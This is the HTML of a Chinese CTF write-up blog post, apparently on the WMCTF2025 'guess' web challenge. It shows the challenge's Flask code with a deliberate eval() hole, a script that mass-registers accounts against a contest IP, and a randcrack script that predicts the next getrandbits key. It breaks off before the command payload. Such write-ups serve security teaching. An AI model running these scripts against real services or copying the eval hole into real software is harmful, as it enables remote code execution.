@@ -1,0 +1,784 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    WMCTF2025web部分题解 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC]  guess(getrandbits伪随机数预测)  前置知识点 [CTF&#x2F;randcrack]python随机数预测模块分析及改进方案_random.getrandbits(32)-CSDN博客  题解 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WMCTF2025web部分题解">
+<meta property="og:url" content="http://example.com/2025/09/22/WMCTF2025web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC]  guess(getrandbits伪随机数预测)  前置知识点 [CTF&#x2F;randcrack]python随机数预测模块分析及改进方案_random.getrandbits(32)-CSDN博客  题解 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250922215825482.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250922220254394.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250922221308111.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250922221324622.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250923103555717.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250923104237484.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250923104417800.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250923104559756.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250923104638000.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250923104745699.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/image-20250923104849497.png">
+<meta property="og:image" content="http://example.com/2025/09/22/images/640.webp">
+<meta property="og:image" content="http://example.com/2025/09/22/images/640-17585969686333.webp">
+<meta property="article:published_time" content="2025-09-22T13:39:44.000Z">
+<meta property="article:modified_time" content="2025-12-10T08:14:38.649Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta property="article:tag" content="getrandbits伪随机数预测">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/09/22/images/image-20250922215825482.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="WMCTF2025web部分题解">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">WMCTF2025web部分题解</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#guessgetrandbits%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text"> guess(getrandbits伪随机数预测)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text"> 前置知识点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text"> 题解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pdf2textpdfpickle%E6%B2%A1%E6%87%82"><span class="toc-number">2.</span> <span class="toc-text"> pdf2text(PDF+pickle&#x3D;没懂)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E9%93%BE%E5%AD%90"><span class="toc-number">2.1.</span> <span class="toc-text"> 找链子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-2"><span class="toc-number">2.2.</span> <span class="toc-text"> 题解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.3.</span> <span class="toc-text"> 参考</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-WMCTF2025web部分题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/09/22/WMCTF2025web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-09-22T13:39:44.000Z" itemprop="datePublished">2025-09-22</time>
+    <time style="display: none;" id="post-update-time">2025-12-10</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<h2 id="guessgetrandbits伪随机数预测"><a class="markdownIt-Anchor" href="#guessgetrandbits伪随机数预测"></a> guess(getrandbits伪随机数预测)</h2>
+<h3 id="前置知识点"><a class="markdownIt-Anchor" href="#前置知识点"></a> 前置知识点</h3>
+<p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42557115/article/details/128228201">CTF/randcrack]python随机数预测模块分析及改进方案_random.getrandbits(32)-CSDN博客</a></p>
+<h3 id="题解"><a class="markdownIt-Anchor" href="#题解"></a> 题解</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, session, render_template, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">rd = random.Random()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(rd.getrandbits(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_string()</span><br><span class="line"></span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line">a = generate_random_string()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username and password are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(user[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">for</span> user <span class="keyword">in</span> users):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username already exists&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    user_id = generate_random_string()</span><br><span class="line">    </span><br><span class="line">    users.append(&#123;</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;User registered successfully&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user_id</span><br><span class="line">    &#125;), <span class="number">201</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Username and password are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> users <span class="keyword">if</span> user[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> user[<span class="string">&#x27;password&#x27;</span>] == password), <span class="literal">None</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid credentials&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line">    </span><br><span class="line">    session[<span class="string">&#x27;user_id&#x27;</span>] = user[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = user[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Login successful&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_id&#x27;</span>: user[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    &#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">protected_api</span>():</span><br><span class="line"></span><br><span class="line">    data = request.get_json()</span><br><span class="line"></span><br><span class="line">    key1 = data.get(<span class="string">&#x27;key&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> key1:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;key are required&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    key2 = generate_random_string()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">str</span>(key1) == <span class="built_in">str</span>(key2):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Not Allowed:&#x27;</span> + <span class="built_in">str</span>(key2) ,</span><br><span class="line">        &#125;), <span class="number">403</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    payload = data.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        <span class="built_in">eval</span>(payload, &#123;<span class="string">&#x27;__builtin__&#x27;</span>:&#123;&#125;&#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Access granted&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;user_id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5001</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>精华蜷缩在这里：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rd = random.Random()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(rd.getrandbits(<span class="number">32</span>))</span><br></pre></td></tr></table></figure>
+<p>创建了一个新的 <code>Random</code> 类实例并赋值给 <code>rd</code></p>
+<p>调用 <code>rd.getrandbits(32)</code>：从该 RNG 产生<strong>一个 32 位的无符号随机整数</strong>，然后用 <code>str()</code> 把这个整数转为十进制字符串并返回</p>
+<p>而漏洞就在于getrandbits()是可以进行预测的</p>
+<p>getrandbits 32 需要预测624位，这里注册可以获得624个示例，所以写一个自动注册脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>():</span><br><span class="line">    returnstr(random.Random().getrandbits(<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">remote = <span class="string">&quot;http://49.232.42.74:32055/register&quot;</span></span><br><span class="line"><span class="comment">#remote2 = &quot;http://4a8855f1-d806-4246-be2b-11feaa08ea99.wmctf-ins.wm-team.cn/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;generate_random_string()&#125;</span>&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;generate_random_string()&#125;</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i inrange(<span class="number">624</span>):</span><br><span class="line">    data[<span class="string">&quot;username&quot;</span>] = <span class="string">f&quot;<span class="subst">&#123;generate_random_string()&#125;</span>&quot;</span></span><br><span class="line">    data[<span class="string">&quot;password&quot;</span>] = <span class="string">f&quot;<span class="subst">&#123;generate_random_string()&#125;</span>&quot;</span></span><br><span class="line">    response = requests.post(remote, json=data)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;response.json()[<span class="string">&#x27;user_id&#x27;</span>]&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250922215825482.png" alt="image-20250922215825482" /></p>
+<p>然后再预测下一个随机数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line">rc = RandCrack()</span><br><span class="line">a=<span class="string">&#x27;&#x27;&#x27;624个随机数&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 1) 安全地遍历每一行，跳过空行</span></span><br><span class="line">vals = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> a.strip().splitlines():</span><br><span class="line">    line = line.strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    val = <span class="built_in">int</span>(line)  <span class="comment"># 如果不是十进制数会抛异常</span></span><br><span class="line">    <span class="keyword">if</span> val &lt; <span class="number">0</span> <span class="keyword">or</span> val &gt; <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;value <span class="subst">&#123;val&#125;</span> out of 32-bit range&quot;</span>)</span><br><span class="line">    vals.append(val)</span><br><span class="line">    rc.submit(val)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;已提交 <span class="subst">&#123;<span class="built_in">len</span>(vals)&#125;</span> 个 32-bit 数。&quot;</span>)</span><br><span class="line"><span class="comment"># 2) 检查数量是否足够</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(vals) &lt; <span class="number">624</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;样本数量不足：需要 624 个 getrandbits(32) 的输出才能恢复 Mersenne Twister 的完整状态。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 只有在提交 &gt;= 624 时才可预测</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;预测下一个 32-bit 值：&quot;</span>, rc.predict_getrandbits(<span class="number">32</span>))</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250922220254394.png" alt="image-20250922220254394" /></p>
+<p>知道了下一个随机数就可以执行命令了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(payload, &#123;<span class="string">&#x27;__builtin__&#x27;</span>:&#123;&#125;&#125;)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><code>&#123;'__builtin__':&#123;&#125;&#125;</code></strong>: 第二个参数，限制可访问的全局命名空间</li>
+</ul>
+<p>可以直接执行命令：</p>
